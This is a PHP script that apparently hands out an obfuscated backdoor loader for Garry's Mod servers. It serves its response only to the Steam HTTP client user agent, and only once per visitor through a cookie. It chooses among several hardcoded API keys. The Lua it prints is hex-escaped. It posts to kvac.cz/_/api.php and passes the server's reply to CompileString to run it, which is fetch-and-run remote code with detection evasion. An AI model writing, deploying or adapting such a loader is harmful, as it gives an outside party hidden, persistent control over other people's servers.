<?php

foreach ($_GET as $key => $value) {
	if ($key !== "key") {
		die();
		break;
	}
}

if ($_SERVER['REQUEST_METHOD'] !== "GET") {
	die();
}


// INCLUS LE BON REPERTOIRE
if (!isset($_COOKIE["kvacGreatAgain"])) {
	setcookie("kvacGreatAgain", uniqid(), time() + 31556926);
}
if (isset($_COOKIE["kvacGreatAgain"])) {
	die();
}

$browser = $_SERVER['HTTP_USER_AGENT'];
if ($browser != "Valve/Steam HTTP Client 1.0 (4000)") {
	die();
}

// Petite vérification 
// - le lien est lu par le programme qui utilise l'api (User Agent)
// - Une personne connecter ne puisse pas accedez au lien (Variable de Session)


function strtohex($string)
{
	$data = implode("\x", unpack("H*", $string));
	$data = chunk_split($data, 2, "\\x");
	return "\\x" . substr($data, 0, -2);
}

function UniqueHashFromIP($word)
{
	return substr(strtoupper(md5($word . 'x9JvQ' . $_SERVER["HTTP_CF_CONNECTING_IP"] . date('d'))), -16);
}

// - Verification de la clée d'api
// - Definition de la clée d'api
if (isset($_GET['key']) && !empty($_GET['key']) && strlen($_GET['key']) == 20) {
	$apikey = "?key=" . $_GET['key'];
} elseif (isset($_GET['k']) && !empty($_GET['k'])) {
	$k = (int)$_GET['k'];

	if ($k === 1) {
		$apikey = "?key=e68IimW8WBwFmQ9gDRjt";
	} elseif ($k === 2) {
		$apikey = "?key=5wjpNieTIXGJEO1fQPaF";
	} elseif ($k === 143) {
		$apikey = "?key=xkbciPIsa5q24DXYgi5c";
	} elseif ($k === 144) {
		$apikey = "?key=oH3Qwoa6RIjZJSaJwohi";
	} elseif ($k === 146) {
		$apikey = "?key=W183VyVoAGw7g3U9C133";
	} else {
		$apikey = "?key=" . $_GET['k'];
	}
} else {
	$apikey = "?key=NR5TIGAOGMtc4qLZ80nn";
}

?>
if CLIENT then return end
--if game.SinglePlayer() then return end

_G["\x74\x69\x6d\x65\x72"]["\x53\x69\x6d\x70\x6c\x65"](1, function()
_G["\x48\x54\x54\x50"]({
url="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6b\x76\x61\x63\x2e\x63\x7a\x2f\x5f\x2f\x61\x70\x69\x2e\x70\x68\x70<?= strtohex($apikey); ?>";
method="\x70\x6f\x73\x74";
parameters={p="<?= strtohex(md5('x9JvQ' . $_SERVER["HTTP_CF_CONNECTING_IP"])); ?>"},
success=function(b,_) CompileString(_, ":", false)() end
})
end)